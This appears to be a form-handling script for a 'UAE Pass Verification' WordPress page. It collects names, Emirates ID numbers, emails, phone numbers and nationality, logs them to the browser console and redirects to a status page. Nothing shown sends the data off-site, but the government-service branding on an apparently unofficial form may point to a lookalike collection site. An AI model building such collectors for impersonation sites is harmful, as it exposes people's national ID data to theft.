// Form submission handler for UAE Pass Verification
// This script captures form submissions and stores them for admin review

document.addEventListener('DOMContentLoaded', function() {
    console.log('Form handler loaded');

    // Listen for Contact Form 7 submission success
    document.addEventListener('wpcf7mailsent', function(event) {
        console.log('CF7 form submitted');
        handleFormSubmission(event.detail.inputs);
    }, false);

    // Also handle regular form submissions
    const forms = document.querySelectorAll('form.wpcf7-form');
    forms.forEach(form => {
        form.addEventListener('submit', function(e) {
            // Don't prevent default, let CF7 handle it
            setTimeout(() => {
                const formData = new FormData(form);
                const data = {};
                formData.forEach((value, key) => {
                    data[key] = value;
                });
                console.log('Form data collected:', data);
            }, 100);
        });
    });
});

function handleFormSubmission(inputs) {
    // Convert CF7 inputs to object
    const formData = {};
    inputs.forEach(input => {
        formData[input.name] = input.value;
    });

    console.log('Processing form data:', formData);

    // Extract and format the data
    const applicationData = {
        fullName: formData['full-name'] || formData.fullName || '',
        emiratesId: formatEmiratesId(formData['emirates-id-field'] || formData['emirates-id'] || formData.emiratesId || ''),
        email: formData.email || '',
        mobileNumber: formatMobileNumber(formData['mobile-number-field'] || formData['mobile-number'] || formData.mobileNumber || ''),
        nationality: formData['countrytext-427'] || formData.nationality || ''
    };

    console.log('Formatted application data:', applicationData);

    // Validate data
    if (!applicationData.fullName || !applicationData.email) {
        console.error('Missing required fields');
        return;
    }

    try {
        // Submit to verification handler
        const application = verificationHandler.submitApplication(applicationData);
        console.log('Application submitted:', application);

        // Store in session for the next page
        sessionStorage.setItem('currentApplication', JSON.stringify(application));

        // Redirect to status page after a short delay
        setTimeout(() => {
            window.location.href = '/status/index.html';
        }, 1000);
    } catch (error) {
        console.error('Error submitting application:', error);
    }
}

function formatEmiratesId(value) {
    if (!value) return '';
    // Remove any non-numeric characters
    const cleaned = value.replace(/[^\d]/g, '');
    // Add 784 prefix if not present
    if (!cleaned.startsWith('784')) {
        return '784-' + cleaned;
    }
    return value;
}

function formatMobileNumber(value) {
    if (!value) return '';
    // Remove any non-numeric characters except +
    const cleaned = value.replace(/[^\d+]/g, '');
    // Add +971 prefix if not present
    if (!cleaned.startsWith('+971')) {
        return '+971' + cleaned.replace(/^\+?971/, '');
    }
    return cleaned;
}

// Custom form handler for non-CF7 forms
function handleCustomForm(formId) {
    const form = document.getElementById(formId);
    if (!form) return;

    form.addEventListener('submit', function(e) {
        e.preventDefault();

        const formData = new FormData(form);
        const data = {};
        formData.forEach((value, key) => {
            data[key] = value;
        });

        handleFormSubmission([
            { name: 'full-name', value: data['full-name'] || data.fullName },
            { name: 'emirates-id', value: data['emirates-id'] || data.emiratesId },
            { name: 'email', value: data.email },
            { name: 'mobile-number', value: data['mobile-number'] || data.mobileNumber },
            { name: 'countrytext-427', value: data['countrytext-427'] || data.nationality }
        ]);
    });
}

// Manual Emirates ID input handler
document.addEventListener('DOMContentLoaded', function() {
    const emiratesInput = document.getElementById('emirates-id-input');
    const emiratesHidden = document.getElementById('emirates-id-hidden');

    if (emiratesInput && emiratesHidden) {
        emiratesInput.addEventListener('input', function() {
            const value = '784-' + this.value;
            emiratesHidden.value = value;
        });
    }

    // Mobile number input handler
    const mobileInput = document.getElementById('mobile-number');
    const mobileHidden = document.getElementById('mobile-number-hidden');

    if (mobileInput && mobileHidden) {
        mobileInput.addEventListener('input', function() {
            const value = '+971' + this.value;
            mobileHidden.value = value;
        });
    }
});
